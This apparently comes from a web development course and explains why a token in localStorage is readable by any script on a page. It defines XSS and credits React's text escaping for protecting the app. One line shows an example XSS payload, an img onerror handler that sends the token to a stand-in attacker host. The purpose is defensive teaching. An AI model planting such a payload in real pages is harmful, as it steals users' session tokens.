Any Script on the Page Can Read It

The Console just read the token, and so could any other JavaScript on the page. That's the trade-off of localStorage, and why React showing text as text matters.

On the last slide, three lines in the Console read the token. Code typed into the Console runs on the page, like the app's own code. So any JavaScript that runs on the page can do the same. tokenStorage.js says so in its top comment:

// Figure 4.4: the trade-off (src/api/tokenStorage.js, top comment)
// The trade-off: any JavaScript running on the page can read localStorage.
// If an attacker ever got a script onto the page (an XSS attack), they
// could copy the token. The safer alternative is an httpOnly cookie, which
// scripts can't read at all, but that needs changes to the back-end, so
// this app keeps localStorage and is careful never to run other people's
// code.

What an XSS attack is

XSS (cross-site scripting) means getting your JavaScript to run on someone else's page. The usual way in is text that users type and other users see: a ticket's subject, a comment. If a page ever treated that text as HTML, a "subject" like

<img src="x" onerror="sendTheTokenTo('evil.example')">

would become a real image tag in everyone's browser, and its onerror code would run there, with access to their token.

What protects this app

React writes {ticket.subject} as text, never as HTML. A subject full of angle brackets shows up on screen as angle brackets. Blade's {{ $ticket->subject }} does the same, for the same reason.

React has exactly one way to insert raw HTML, and it's named dangerouslySetInnerHTML so nobody uses it by accident. This app never uses it.

The alternative

An httpOnly cookie is one that the browser sends with requests but won't let any script read, so XSS can't steal it. Laravel's session cookie is httpOnly. Using one here would mean back-end changes: setting the cookie at login, reading it instead of the Authorization header, changing the CORS settings, and protecting against a different attack (CSRF). For this module, localStorage and care are the trade-off.
